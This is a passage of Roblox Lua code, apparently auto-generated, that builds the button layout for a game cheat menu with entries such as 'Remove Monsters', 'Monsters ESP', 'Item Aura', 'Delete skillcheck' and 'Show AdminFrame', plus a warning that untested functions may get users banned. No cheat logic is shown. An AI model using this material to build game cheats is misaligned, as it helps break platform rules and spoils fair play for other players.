G2L["a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a9"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a9"]["TextSize"] = 30;
G2L["a9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a9"]["Size"] = UDim2.new(0, 359, 0, 30);
G2L["a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a9"]["Text"] = [[Misc]];
G2L["a9"]["Name"] = [[Player]];
G2L["a9"]["BackgroundTransparency"] = 1;
G2L["a9"]["Position"] = UDim2.new(0.02135455422103405, 0, 0.5359130501747131, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player.UICorner
G2L["aa"] = Instance.new("UICorner", G2L["a9"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.rm
G2L["ab"] = Instance.new("TextButton", G2L["81"]);
G2L["ab"]["TextWrapped"] = true;
G2L["ab"]["BorderSizePixel"] = 0;
G2L["ab"]["TextScaled"] = true;
G2L["ab"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ab"]["TextSize"] = 14;
G2L["ab"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ab"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["ab"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["ab"]["Name"] = [[rm]];
G2L["ab"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ab"]["Text"] = [[Remove Monsters]];
G2L["ab"]["Position"] = UDim2.new(0.010582010261714458, 0, 0.616847813129425, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.rm.UIStroke
G2L["ac"] = Instance.new("UIStroke", G2L["ab"]);
G2L["ac"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["ac"]["Thickness"] = 3;
G2L["ac"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.rm.LocalScript
G2L["ad"] = Instance.new("LocalScript", G2L["ab"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.xdd
G2L["ae"] = Instance.new("TextButton", G2L["81"]);
G2L["ae"]["TextWrapped"] = true;
G2L["ae"]["BorderSizePixel"] = 0;
G2L["ae"]["TextScaled"] = true;
G2L["ae"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ae"]["TextSize"] = 14;
G2L["ae"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ae"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["ae"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["ae"]["Name"] = [[xdd]];
G2L["ae"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ae"]["Text"] = [[Animation GUI]];
G2L["ae"]["Position"] = UDim2.new(0.3333333432674408, 0, 0.616847813129425, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.xdd.UIStroke
G2L["af"] = Instance.new("UIStroke", G2L["ae"]);
G2L["af"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["af"]["Thickness"] = 3;
G2L["af"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.xdd.LocalScript
G2L["b0"] = Instance.new("LocalScript", G2L["ae"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.sadasd
G2L["b1"] = Instance.new("TextButton", G2L["81"]);
G2L["b1"]["TextWrapped"] = true;
G2L["b1"]["BorderSizePixel"] = 0;
G2L["b1"]["TextScaled"] = true;
G2L["b1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b1"]["TextSize"] = 14;
G2L["b1"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b1"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["b1"]["Size"] = UDim2.new(0, 124, 0, 27);
G2L["b1"]["Name"] = [[sadasd]];
G2L["b1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b1"]["Text"] = [[Remove InvisBorders / InvisWalls]];
G2L["b1"]["Position"] = UDim2.new(0.6613756418228149, 0, 0.616847813129425, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.sadasd.UIStroke
G2L["b2"] = Instance.new("UIStroke", G2L["b1"]);
G2L["b2"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["b2"]["Thickness"] = 3;
G2L["b2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.sadasd.LocalScript
G2L["b3"] = Instance.new("LocalScript", G2L["b1"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.xdd
G2L["b4"] = Instance.new("TextButton", G2L["81"]);
G2L["b4"]["TextWrapped"] = true;
G2L["b4"]["TextStrokeTransparency"] = 0;
G2L["b4"]["BorderSizePixel"] = 0;
G2L["b4"]["TextScaled"] = true;
G2L["b4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b4"]["TextSize"] = 14;
G2L["b4"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b4"]["TextColor3"] = Color3.fromRGB(48, 255, 0);
G2L["b4"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["b4"]["Name"] = [[xdd]];
G2L["b4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b4"]["Text"] = [[select...]];
G2L["b4"]["Position"] = UDim2.new(0.010582010261714458, 0, 0.7336956262588501, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.xdd.UIStroke
G2L["b5"] = Instance.new("UIStroke", G2L["b4"]);
G2L["b5"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["b5"]["Thickness"] = 3;
G2L["b5"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.xdd.LocalScript
G2L["b6"] = Instance.new("LocalScript", G2L["b4"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.getit
G2L["b7"] = Instance.new("TextButton", G2L["81"]);
G2L["b7"]["TextWrapped"] = true;
G2L["b7"]["BorderSizePixel"] = 0;
G2L["b7"]["TextScaled"] = true;
G2L["b7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b7"]["TextSize"] = 14;
G2L["b7"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b7"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["b7"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["b7"]["Name"] = [[getit]];
G2L["b7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b7"]["Text"] = [[buy toon]];
G2L["b7"]["Position"] = UDim2.new(0.33068782091140747, 0, 0.7336956262588501, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.getit.UIStroke
G2L["b8"] = Instance.new("UIStroke", G2L["b7"]);
G2L["b8"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["b8"]["Thickness"] = 3;
G2L["b8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut
G2L["b9"] = Instance.new("TextButton", G2L["81"]);
G2L["b9"]["TextWrapped"] = true;
G2L["b9"]["BorderSizePixel"] = 0;
G2L["b9"]["TextScaled"] = true;
G2L["b9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b9"]["TextSize"] = 14;
G2L["b9"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b9"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["b9"]["Size"] = UDim2.new(0, 125, 0, 27);
G2L["b9"]["Name"] = [[Aut]];
G2L["b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b9"]["Text"] = [[Item Aura]];
G2L["b9"]["Position"] = UDim2.new(0.658730149269104, 0, 0.7336956262588501, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.UIStroke
G2L["ba"] = Instance.new("UIStroke", G2L["b9"]);
G2L["ba"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["ba"]["Thickness"] = 3;
G2L["ba"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.LocalScript
G2L["bb"] = Instance.new("LocalScript", G2L["b9"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut
G2L["bc"] = Instance.new("TextButton", G2L["81"]);
G2L["bc"]["TextWrapped"] = true;
G2L["bc"]["TextStrokeTransparency"] = 0;
G2L["bc"]["BorderSizePixel"] = 0;
G2L["bc"]["TextScaled"] = true;
G2L["bc"]["BackgroundColor3"] = Color3.fromRGB(0, 255, 43);
G2L["bc"]["TextSize"] = 14;
G2L["bc"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["bc"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["bc"]["Size"] = UDim2.new(0, 125, 0, 27);
G2L["bc"]["Name"] = [[Aut]];
G2L["bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bc"]["Text"] = [[PREVIOUS PAGE]];
G2L["bc"]["Position"] = UDim2.new(0.3333333432674408, 0, 0.85597825050354, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.UIStroke
G2L["bd"] = Instance.new("UIStroke", G2L["bc"]);
G2L["bd"]["Color"] = Color3.fromRGB(0, 154, 6);
G2L["bd"]["Thickness"] = 3;
G2L["bd"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.LocalScript
G2L["be"] = Instance.new("LocalScript", G2L["bc"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.getitToon
G2L["bf"] = Instance.new("TextButton", G2L["81"]);
G2L["bf"]["TextWrapped"] = true;
G2L["bf"]["TextStrokeTransparency"] = 0;
G2L["bf"]["BorderSizePixel"] = 0;
G2L["bf"]["TextScaled"] = true;
G2L["bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bf"]["TextSize"] = 14;
G2L["bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["bf"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bf"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["bf"]["Name"] = [[getitToon]];
G2L["bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bf"]["Text"] = [[Get Toon]];
G2L["bf"]["Position"] = UDim2.new(0.010582010261714458, 0, 0.85597825050354, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.getitToon.UIStroke
G2L["c0"] = Instance.new("UIStroke", G2L["bf"]);
G2L["c0"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["c0"]["Thickness"] = 3;
G2L["c0"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.reiniciartodo
G2L["c1"] = Instance.new("TextButton", G2L["81"]);
G2L["c1"]["TextWrapped"] = true;
G2L["c1"]["BorderSizePixel"] = 0;
G2L["c1"]["TextScaled"] = true;
G2L["c1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c1"]["TextSize"] = 14;
G2L["c1"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c1"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["c1"]["Size"] = UDim2.new(0, 122, 0, 27);
G2L["c1"]["Name"] = [[reiniciartodo]];
G2L["c1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c1"]["Text"] = [[Restart all]];
G2L["c1"]["Position"] = UDim2.new(0.6640206575393677, 0, 0.33695653080940247, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.reiniciartodo.UIStroke
G2L["c2"] = Instance.new("UIStroke", G2L["c1"]);
G2L["c2"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["c2"]["Thickness"] = 3;
G2L["c2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFour
G2L["c3"] = Instance.new("Frame", G2L["3"]);
G2L["c3"]["BorderSizePixel"] = 0;
G2L["c3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c3"]["BackgroundTransparency"] = 1;
G2L["c3"]["Size"] = UDim2.new(0, 378, 0, 368);
G2L["c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c3"]["Position"] = UDim2.new(0, 0, 0.05128201097249985, 0);
G2L["c3"]["Visible"] = false;
G2L["c3"]["Name"] = [[MainFour]];

-- StarterGui.DebugVersion.Title.script_content.MainFour.LocalScript
G2L["c4"] = Instance.new("LocalScript", G2L["c3"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.Player
G2L["c5"] = Instance.new("TextLabel", G2L["c3"]);
G2L["c5"]["TextWrapped"] = true;
G2L["c5"]["BorderSizePixel"] = 0;
G2L["c5"]["RichText"] = true;
G2L["c5"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["c5"]["TextScaled"] = true;
G2L["c5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c5"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c5"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c5"]["TextSize"] = 25;
G2L["c5"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["c5"]["Size"] = UDim2.new(0, 371, 0, 28);
G2L["c5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c5"]["Text"] = [[Not Tested Functions]];
G2L["c5"]["Name"] = [[Player]];
G2L["c5"]["BackgroundTransparency"] = 1;
G2L["c5"]["Position"] = UDim2.new(0.007936508394777775, 0, 0.021739130839705467, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.Player.UICorner
G2L["c6"] = Instance.new("UICorner", G2L["c5"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.Player
G2L["c7"] = Instance.new("TextLabel", G2L["c3"]);
G2L["c7"]["TextWrapped"] = true;
G2L["c7"]["BorderSizePixel"] = 0;
G2L["c7"]["RichText"] = true;
G2L["c7"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["c7"]["TextScaled"] = true;
G2L["c7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c7"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c7"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c7"]["TextSize"] = 25;
G2L["c7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c7"]["Size"] = UDim2.new(0, 371, 0, 28);
G2L["c7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c7"]["Text"] = [[(They are functions i dint test it, so idk if it can ban you)]];
G2L["c7"]["Name"] = [[Player]];
G2L["c7"]["BackgroundTransparency"] = 1;
G2L["c7"]["Position"] = UDim2.new(0, 0, 0.09782608598470688, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.Player.UICorner
G2L["c8"] = Instance.new("UICorner", G2L["c7"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt
G2L["c9"] = Instance.new("TextButton", G2L["c3"]);
G2L["c9"]["TextWrapped"] = true;
G2L["c9"]["TextStrokeTransparency"] = 0;
G2L["c9"]["BorderSizePixel"] = 0;
G2L["c9"]["TextScaled"] = true;
G2L["c9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c9"]["TextSize"] = 14;
G2L["c9"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c9"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["c9"]["Size"] = UDim2.new(0, 111, 0, 32);
G2L["c9"]["Name"] = [[callatt]];
G2L["c9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c9"]["Text"] = [[Dandy Select vote]];
G2L["c9"]["Position"] = UDim2.new(0.01587301678955555, 0, 0.17391304671764374, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.UIStroke
G2L["ca"] = Instance.new("UIStroke", G2L["c9"]);
G2L["ca"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["ca"]["Thickness"] = 3;
G2L["ca"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
G2L["cb"] = Instance.new("LocalScript", G2L["c9"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt
G2L["cc"] = Instance.new("TextButton", G2L["c3"]);
G2L["cc"]["TextWrapped"] = true;
G2L["cc"]["TextStrokeTransparency"] = 0;
G2L["cc"]["BorderSizePixel"] = 0;
G2L["cc"]["TextScaled"] = true;
G2L["cc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cc"]["TextSize"] = 14;
G2L["cc"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["cc"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["cc"]["Size"] = UDim2.new(0, 111, 0, 32);
G2L["cc"]["Name"] = [[callatt]];
G2L["cc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cc"]["Text"] = [[Delete Vee Pop up]];
G2L["cc"]["Position"] = UDim2.new(0.35185185074806213, 0, 0.17391304671764374, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.UIStroke
G2L["cd"] = Instance.new("UIStroke", G2L["cc"]);
G2L["cd"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["cd"]["Thickness"] = 3;
G2L["cd"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
G2L["ce"] = Instance.new("LocalScript", G2L["cc"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt
G2L["cf"] = Instance.new("TextButton", G2L["c3"]);
G2L["cf"]["TextWrapped"] = true;
G2L["cf"]["TextStrokeTransparency"] = 0;
G2L["cf"]["BorderSizePixel"] = 0;
G2L["cf"]["TextScaled"] = true;
G2L["cf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cf"]["TextSize"] = 14;
G2L["cf"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["cf"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["cf"]["Size"] = UDim2.new(0, 111, 0, 32);
G2L["cf"]["Name"] = [[callatt]];
G2L["cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cf"]["Text"] = [[Delete skillcheck]];
G2L["cf"]["Position"] = UDim2.new(0.6878306865692139, 0, 0.17391304671764374, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.UIStroke
G2L["d0"] = Instance.new("UIStroke", G2L["cf"]);
G2L["d0"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["d0"]["Thickness"] = 3;
G2L["d0"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
G2L["d1"] = Instance.new("LocalScript", G2L["cf"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt
G2L["d2"] = Instance.new("TextButton", G2L["c3"]);
G2L["d2"]["TextWrapped"] = true;
G2L["d2"]["TextStrokeTransparency"] = 0;
G2L["d2"]["BorderSizePixel"] = 0;
G2L["d2"]["TextScaled"] = true;
G2L["d2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d2"]["TextSize"] = 14;
G2L["d2"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d2"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["d2"]["Size"] = UDim2.new(0, 111, 0, 32);
G2L["d2"]["Name"] = [[callatt]];
G2L["d2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d2"]["Text"] = [[Dandy CS (use boxten))]];
G2L["d2"]["Position"] = UDim2.new(0.01587301678955555, 0, 0.301630437374115, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.UIStroke
G2L["d3"] = Instance.new("UIStroke", G2L["d2"]);
G2L["d3"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["d3"]["Thickness"] = 3;
G2L["d3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
G2L["d4"] = Instance.new("LocalScript", G2L["d2"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt
G2L["d5"] = Instance.new("TextButton", G2L["c3"]);
G2L["d5"]["TextWrapped"] = true;
G2L["d5"]["TextStrokeTransparency"] = 0;
G2L["d5"]["BorderSizePixel"] = 0;
G2L["d5"]["TextScaled"] = true;
G2L["d5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d5"]["TextSize"] = 14;
G2L["d5"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d5"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["d5"]["Size"] = UDim2.new(0, 111, 0, 32);
G2L["d5"]["Name"] = [[callatt]];
G2L["d5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d5"]["Text"] = [[Old Monsters ESP]];
G2L["d5"]["Position"] = UDim2.new(0.35185185074806213, 0, 0.301630437374115, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.UIStroke
G2L["d6"] = Instance.new("UIStroke", G2L["d5"]);
G2L["d6"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["d6"]["Thickness"] = 3;
G2L["d6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
G2L["d7"] = Instance.new("LocalScript", G2L["d5"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt
G2L["d8"] = Instance.new("TextButton", G2L["c3"]);
G2L["d8"]["TextWrapped"] = true;
G2L["d8"]["TextStrokeTransparency"] = 0;
G2L["d8"]["BorderSizePixel"] = 0;
G2L["d8"]["TextScaled"] = true;
G2L["d8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d8"]["TextSize"] = 14;
G2L["d8"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d8"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["d8"]["Size"] = UDim2.new(0, 111, 0, 32);
G2L["d8"]["Name"] = [[callatt]];
G2L["d8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d8"]["Text"] = [[Show AdminFrame]];
G2L["d8"]["Position"] = UDim2.new(0.6878306865692139, 0, 0.301630437374115, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.UIStroke
G2L["d9"] = Instance.new("UIStroke", G2L["d8"]);
G2L["d9"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["d9"]["Thickness"] = 3;
G2L["d9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
G2L["da"] = Instance.new("LocalScript", G2L["d8"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.ScrollingFrame
G2L["db"] = Instance.new("ScrollingFrame", G2L["c3"]);
G2L["db"]["Active"] = true;
G2L["db"]["BorderSizePixel"] = 0;
G2L["db"]["TopImage"] = [[]];
G2L["db"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["db"]["BackgroundTransparency"] = 0.9990000128746033;
G2L["db"]["Size"] = UDim2.new(0, 378, 0, 67);
G2L["db"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["db"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["db"]["Position"] = UDim2.new(-0.0026455025654286146, 0, 0.489130437374115, 0);
G2L["db"]["BottomImage"] = [[]];

-- StarterGui.DebugVersion.Title.script_content.MainFour.ScrollingFrame.LocalScript
G2L["dc"] = Instance.new("LocalScript", G2L["db"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.Player
G2L["dd"] = Instance.new("TextLabel", G2L["c3"]);
G2L["dd"]["TextWrapped"] = true;
G2L["dd"]["BorderSizePixel"] = 0;
G2L["dd"]["RichText"] = true;
G2L["dd"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["dd"]["TextScaled"] = true;
G2L["dd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["dd"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["dd"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["dd"]["TextSize"] = 25;
G2L["dd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["dd"]["Size"] = UDim2.new(0, 371, 0, 28);
G2L["dd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["dd"]["Text"] = [[set values]];
G2L["dd"]["Name"] = [[Player]];
G2L["dd"]["BackgroundTransparency"] = 1;
G2L["dd"]["Position"] = UDim2.new(0, 0, 0.41304346919059753, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.Player.UICorner
G2L["de"] = Instance.new("UICorner", G2L["dd"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt
G2L["df"] = Instance.new("TextButton", G2L["c3"]);
G2L["df"]["TextWrapped"] = true;
G2L["df"]["TextStrokeTransparency"] = 0;
G2L["df"]["BorderSizePixel"] = 0;
G2L["df"]["TextScaled"] = true;
G2L["df"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["df"]["TextSize"] = 14;
G2L["df"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["df"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["df"]["Size"] = UDim2.new(0, 111, 0, 32);
G2L["df"]["Name"] = [[callatt]];
G2L["df"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["df"]["Text"] = [[Auto-Do Machines]];
G2L["df"]["Position"] = UDim2.new(0.0317460335791111, 0, 0.7010869383811951, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.UIStroke
G2L["e0"] = Instance.new("UIStroke", G2L["df"]);
G2L["e0"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["e0"]["Thickness"] = 3;
G2L["e0"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
G2L["e1"] = Instance.new("LocalScript", G2L["df"]);


-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt
G2L["e2"] = Instance.new("TextButton", G2L["c3"]);
G2L["e2"]["TextWrapped"] = true;
G2L["e2"]["TextStrokeTransparency"] = 0;
G2L["e2"]["BorderSizePixel"] = 0;
G2L["e2"]["RichText"] = true;
G2L["e2"]["TextScaled"] = true;
G2L["e2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e2"]["TextSize"] = 14;
G2L["e2"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e2"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["e2"]["Size"] = UDim2.new(0, 111, 0, 32);
G2L["e2"]["Name"] = [[callatt]];
G2L["e2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e2"]["Text"] = [[dandy's glitch World]];
G2L["e2"]["Position"] = UDim2.new(0.35185185074806213, 0, 0.7010869383811951, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.UIStroke
G2L["e3"] = Instance.new("UIStroke", G2L["e2"]);
G2L["e3"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["e3"]["Thickness"] = 3;
G2L["e3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
G2L["e4"] = Instance.new("LocalScript", G2L["e2"]);


